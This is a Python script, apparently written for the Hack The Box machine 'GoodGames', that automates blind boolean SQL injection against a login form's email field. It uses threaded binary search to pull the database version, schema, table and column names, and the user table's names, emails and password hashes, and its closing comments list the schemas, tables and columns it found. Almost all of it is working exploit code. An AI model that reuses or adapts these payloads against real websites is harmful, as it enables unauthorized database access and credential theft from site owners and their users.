#!/usr/bin/env python3

import time
import requests
import threading

req_sess = requests.Session()

URL = 'http://goodgames.htb/login'
THREAD_AMOUNT = 20

def make_request(injection):

	payload = {'email':injection, 'password':'1234'}

	response = req_sess.post(URL, data=payload)

	return response.text

def get_injections(path):
	with open(path, 'r') as rf:
		content = rf.readlines()

	return content

def check_if_vulnerable():
	injection_list = get_injections('sqli-logic.txt')

	for injection in injection_list:
		response = make_request(injection[:-1]) #remove last \n

		if response == 200:
			print(injection[:-1])

def discover_string(injection, error_string, last_discovered):
	string = b''
	i=0

	while True:
		l = 1
		r = 128
		i += 1

		for c in last_discovered:
			payload = injection.format(i,'=',ord(c))
			resp_text = make_request(payload)
			
			if not error_string in resp_text:
				i += 1
				string += c.encode()
				#print(string, end='\r')
			else:
				break

		while l <= r:

			mid = l + (r - l) // 2

			# Check if x is present at mid
			payload = injection.format(i,'=',mid)
			resp_text = make_request(payload)
			#print(f"{payload} ---- {resp_text}")

			if not error_string in resp_text:
				string += chr(mid).encode()
				#print(string, end='\r')
				break

			payload = injection.format(i,'>',mid) # is substr(i) > mid ??
			resp_text = make_request(payload)
			#print(f"{payload} ---- {resp_text}")

			if not error_string in resp_text:
				l = mid + 1
			else:
				r = mid - 1

		if l > r: #if l > r, char was not found, end of string is reached
			print(string)
			return string

def discover_rows(injection):
	
	index = 0
	error_string = 'GoodGames | 500'
	name = b''

	threads = list()

	while True:
		helper = injection.format(index)

		x = threading.Thread(target=discover_string, args=(helper, error_string, name.decode('utf8')))
		threads.append(x)
		x.start()

		if len(threads) >= THREAD_AMOUNT:
			for thread in threads:
				thread.join()

			threads.clear()


		'''
		name = discover_string(helper, OK_code, name.decode('utf8'))

		if name == b'':
			break
		else:
			print(name)
		'''

		index += 1

def manual():

	while True:
		injection = input('+: ')
		print(make_request(f"{injection}"))

def main():
	database_version = "1' or (SELECT ASCII(SUBSTRING(@@VERSION,{{}},1)) LIMIT {},1){{}}{{}}-- -"
	database_injection = "1' or (SELECT ASCII(SUBSTRING(schema_name,{{}},1)) FROM information_schema.schemata LIMIT {},1){{}}{{}}-- -"
	#tables_injection = "1' or (SELECT ASCII(SUBSTRING(table_name,{{}},1)) FROM information_schema.tables LIMIT {},1){{}}{{}}-- -"
	tables_injection = "1' or (SELECT ASCII(SUBSTRING(table_name,{{}},1)) FROM information_schema.tables WHERE table_schema='main' LIMIT {},1){{}}{{}}-- -"
	#tables_injection = "1' or (SELECT ASCII(SUBSTRING(CONCAT(information_schema.tables.table_schema,'~',information_schema.tables.table_name),{{}},1)) FROM information_schema.tables LIMIT {},1){{}}{{}}"
	views_injection = "1' or (SELECT ASCII(SUBSTRING(CONCAT(table_schema,'~',table_name),{{}},1)) FROM information_schema.views ORDER BY table_schema LIMIT {},1){{}}{{}}"
	rows_injection = "1' or (SELECT ASCII(SUBSTRING(CONCAT(column_name),{{}},1)) FROM information_schema.columns WHERE table_name='user' ORDER BY column_name LIMIT {},1){{}}{{}}-- -"
	#table_injection = "1' or (SELECT ASCII(SUBSTRING(CONCAT(email,'~',password),{{}},1)) FROM accounts LIMIT {},1){{}}{{}}"
	table_injection = "1' or (SELECT ASCII(SUBSTRING(CONCAT(name,'~',email,'~',password),{{}},1)) FROM user LIMIT {},1){{}}{{}}-- -"


	#check_if_vulnerable()
	#manual()
	#discover_rows(database_version)
	#discover_rows(database_injection)
	#discover_rows(tables_injection)
	#discover_rows(views_injection)
	#discover_rows(rows_injection)
	discover_rows(table_injection)

	#user_injection = "1 or (SELECT ASCII(SUBSTRING(USER(),{{}},1))){{}}{{}}"
	#discover_string(user_injection, 'Ticket Exists')

if __name__ == '__main__':
	main()


#### Schemas
# b'main'
# b'information_schema'

#### Tables (main)
# b'blog'
# b'user'
# b'blog_comments'

#### Columns (user)
# id
# name
# email
# password